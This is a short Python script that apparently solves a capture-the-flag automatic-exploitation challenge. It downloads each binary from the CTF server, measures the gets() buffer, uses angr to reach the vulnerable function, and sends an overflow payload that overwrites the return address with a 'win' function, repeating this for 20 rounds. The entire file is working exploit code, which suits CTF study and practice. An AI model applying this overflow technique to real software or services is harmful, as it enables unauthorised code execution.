from pwn import *
from binaryninja import open_view
import base64
import angr

def get_buff_size(bv):
    for ref in bv.get_code_refs(bv.get_symbol_by_raw_name("gets").address):
        param = ref.function.get_parameter_at(ref.address,None,0)
        buf_size = abs(param.value)
        print(hex(buf_size))
        return buf_size

def send_payload(io,bv,s):
    proj = angr.Project("./vuln")
    state = proj.factory.blank_state(addr=bv.get_symbol_by_raw_name("main").address)
    simgr = proj.factory.simgr(state)
    simgr.explore(find=bv.get_symbol_by_raw_name("vuln").address)
    win = bv.get_symbol_by_raw_name("win")
    io.send(simgr.found[0].posix.dumps(0))
    payload = b"A"*s
    payload += p64(win.address)
    io.sendline(payload)

def get_chal(io):
    binary = io.readuntil(b"=\n")
    with open("vuln","wb") as f:
        f.write(base64.b64decode(binary.replace(b"\n",b"")))

    context.binary = elf = ELF("vuln")
    return open_view("vuln")


io = remote("pwn.dvc.tf", 8890)

for x in range(20):
    bv = get_chal(io)
    s = get_buff_size(bv)
    send_payload(io,bv,s)
    io.readuntil(b"payload:\n")

io.interactive()